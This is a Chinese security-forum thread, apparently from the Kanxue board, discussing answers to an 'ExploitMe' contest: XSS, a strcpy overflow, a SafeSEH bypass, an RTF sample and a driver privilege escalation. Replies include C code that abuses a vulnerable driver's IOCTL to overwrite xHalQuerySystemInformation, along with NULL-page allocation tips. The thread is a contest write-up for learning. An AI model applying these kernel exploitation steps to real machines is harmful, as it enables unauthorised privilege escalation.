
# ExploitMe 答案

> 原文：[`www.pediy.com/kssd/pediy12/133315.html`](https://www.pediy.com/kssd/pediy12/133315.html)

第 5 题的 `exploitme.doc`，始终无法成功地执行 `shellcode`，不知是出题者有意为之，还是 `exploit` 有问题，或者我的环境有问题，但 `word` 的版本是对应的，系统也是 `xp sp3`，此题占分最高，但最后还是放弃了![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || ExploitMe 答案.rar  |

这次比赛的题目大多来源于网上的一些利用方法，百度谷歌可以帮你解决很多问题！所以说，善于搜索资料才是一种本事！

## 第一题：

XSS in hidden field：[`sla.ckers.org/forum/read.php?2,17217`](http://sla.ckers.org/forum/read.php?2,17217)

## 第二题：

[`html5sec.org/`](http://html5sec.org/)，思路来源于此，直接用`<a>`标签就成了

## 第三题：

搜索字符串看到 `bho0day`，直接在 URL 中输入提示错误，再 `ctrl+n` 找到 `strcpy`，直接定位漏洞，但有空间限制，不过足够存放 `shellcode` 了，关键是解决跳板问题，我没有写出 `exploit`，后面也没有回头再分析了，坐等各位牛人发码。或许 `heap spary` 是最佳选择，在做此题还想用此方法，结果在写 `exploit` 时，却一直想着找跳板，把神奇的 `heap spary` 给忘了，一根筋挂了

## 第四题：

过 `safeseh` 的方法参见之前 `hackme` 挑战赛上 `watercloud` 给出的方法：[`bbs.pediy.com/showthread.php?t=121314&page=6`](http://bbs.pediy.com/showthread.php?t=121314&page=6)

## 第五题：

给的样本始终无法触发 `shellcode`，问了好几位朋友，只有一人成功触发了，看来这样本也不够稳定啊，无法触发 `shellcode`，就很难通过静态分析来回答那些问题了，果断放弃……若能触发，可先直接百度下该漏洞的 `msf` 模板了解漏洞原理：[`http://packetstormsecurity.or...nts\_bof.rb.txt`](http://http://packetstormsecurity.org/files/view/97153/ms10_087_rtf_pfragments_bof.rb.txt)，再 `OD` 定位 `shellcode`，应该就很好搞定了。

## 第六题：

模仿瑞星本地提权漏洞：[`www.exploit-db.com/exploits/11281/`](http://www.exploit-db.com/exploits/11281/)

论坛上的轩辕小聪大牛也有在论坛上分析过：[`bbs.pediy.com/showthread.php?t=106184`](http://bbs.pediy.com/showthread.php?t=106184)

## 第七题：

模仿 `EVEREST` (`kerneld.sys`) 漏洞：[`www.ntinternals.org/ntiadv0803/ntiadv0803.html`](http://www.ntinternals.org/ntiadv0803/ntiadv0803.html)，其中最后一问，就写内核基址那问，由于 `MmMapIoSpace` 的作用，需要将虚拟地址转换为物理地址以作为输入来利用漏洞，可自己实现地址转换功能，看雪上是有人分析过，参见这里《逆向 `MmGetPhysicalAddress` 并正向》：[`bbs.pediy.com/showthread.php?t=125037`](http://bbs.pediy.com/showthread.php?t=125037)，不过通过 `windbg` 查看我系统上的相关数据结构，发现跟这文章中的内容不一样，上面的代码我也没编译通过。自己也没有实现代码，或者简单点，你可以直接关闭 `CPU` 的分页机制，把物理地址直接当线性地址来利用，这只是个思路，坐等各位大牛报料。

欢迎各位大牛继续跟帖拍砖！！！

引用: *最初由 **KiDebug**发布* ![查看帖子](img/showthread.php?p=954923#post954923) 第七题如果用户有 `SE_LOCK_MEMORY_NAME` 权限，可以参考 `MSDN` 中的《`AWE Example`》，自己申请一片物理内存，映射为虚拟地址，往里面填东西后，再把申请好的物理内存地址传给驱动去覆盖。但这种方式得在管理员下利用。

通用点的方法是：物理内存地址从 `0x1000` 开始遍历，驱动输入缓...

我指的是最后一题的最后一问没搞定！就是写内核基址那个，我原本还想暴力搜索物理内存，找到那串数据被映射到的物理地址，但等了半个多小时还没找到，求 `KiDebug` 指点……

但最后一题我是提权了，下面是我用的方法，`KiDebug` 大牛指点下：

代码:

```
           // 向地址 0x0 处写入数据 0x00000000，
               ULONG InternalBuffer = 0;
        SystemBuffer[0] = sizeof(ULONG);
        SystemBuffer[2] = 0;
        SystemBuffer[3] = (ULONG)&InternalBuffer;
    
        for(i=0; i<PAGE_SIZE; i++)
        {
          SystemBuffer[1] = i;

          NtStatus = NtDeviceIoControlFile(
                                         DeviceHandle,
                                         NULL,
                                         NULL,
                                         NULL,
                                         &IoStatusBlock,
                                         IOCTL_CODE,
                                         SystemBuffer,
                                         16,
                                         SystemBuffer,
                                         16);
            
          if(NtStatus)
          {
            printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
            return NtStatus;
          }

          if(InternalBuffer == 0x00000000)
            break;
        }    

        // 利用漏洞将 0x0 处的 4 字节数据（0x00000000）写入 xHalQuerySystemInformation 函数地址
        SystemBuffer[0] = sizeof(ULONG);
        SystemBuffer[1] = i;
        SystemBuffer[2] = 0;
        SystemBuffer[3] = (ULONG)xHalQuerySystemInformation;

                NtStatus = NtDeviceIoControlFile(
                                                  DeviceHandle,      // FileHandle
                                                  NULL,          // Event
                                                  NULL,          // ApcRoutine
                                                  NULL,          // ApcContext
                                                  &IoStatusBlock,    // IoStatusBlock
                                                  IOCTL_CODE,      // IoControlCode
                                                  SystemBuffer,      // InputBuffer
                                                  16,          // InputBufferLength
                                                  SystemBuffer,      // OutputBuffer
                                                  16);          // OutBufferLength
```

引用: *最初由 **riusksk**发布* ![查看帖子](img/showthread.php?p=954932#post954932) 我指的是最后一题的最后一问没搞定！就是写内核基址那个，我原本还想暴力搜索物理内存，找到那串数据被映射到的物理地址，但等了半个多小时还没找到，求 `KiDebug` 指点……

但最后一题我是提权了，下面是我用的方法，`KiDebug` 大牛指点下：

           // 向地址 0x0 处写入数据 0x00000000，... 

哎，大牛谈不上，我只是个小菜牛。。。。

     // 向地址 0x0 处写入数据 0x00000000，  
     ULONG InternalBuffer = 0;  
        SystemBuffer[0] = sizeof(ULONG);  
        SystemBuffer[2] = 0;  
        SystemBuffer[3] = (ULONG)&InternalBuffer;  

这儿你的理解有误。假设物理地址 `i` 处保存的数据为 `X`，驱动将把 `X` 写到 `InternalBuffer` 这个变量里面。接下来判断如果 `InternalBuffer` 为 `0`，那么就说明物理地址 `i` 处保存的也是 `0`。然后再次把 物理地址 `i` 传给驱动，把它里面保存的 `0` 用来覆盖掉 `xHalQuerySystemInformation`

“写内核基址”不需要再靠那个驱动去改，既然能进内核了，那就想改啥就改啥了，直接在 `shellcode` 里面改 `ntoskrnl` 前面的 `0x10` 个字节。

引用: *最初由 **QEver**发布* ![查看帖子](img/showthread.php?p=954972#post954972) 看了讨论，感觉自己错过了一些很精彩的东西～～![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")  

`KiDebug` 说的"`C` 需要是用户态的地址，最好是 `0`，因为一般情况下 `0` 地址没人用"，在 `Windows` 中内存地址从 `0x0000` 到 `0xffff` 不是所谓的无效断点分配分区么？是不能被使用的？额，核编上说的是 `win2000`，感觉 `Window`... 

`VirtualAlloc` 调用 `VirtualAllocEx`，在 `VirtualAllocEx` 里面会比较传入的起始地址是不是小于 `BaseStaticServerData+0x13C` 处的值，这个值是 `0x10000`，如果小于的话就返回失败，大于的话继续调用 `NtAllocateVirtualMemory`。所以要分配从 `0` 开始的一段内存就得直接调用 `NtAllocateVirtualMemory`，并且传入的起始地址要大于 `0`，像 `1`、`2`、`3`、`4`…都可以，`0` 的话 `Windows` 就自作主张地随便选个地方分配，就不是从 `0` 开始了。内存按一整页开始分配，传入一页中间的一个地址（`1`、`2`、`3`、`4`…），分配好了后就返回页的起始地址，也就是 `0`。

传份我写的源代码和 `EXE`

上传的附件

| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || 7.rar  |
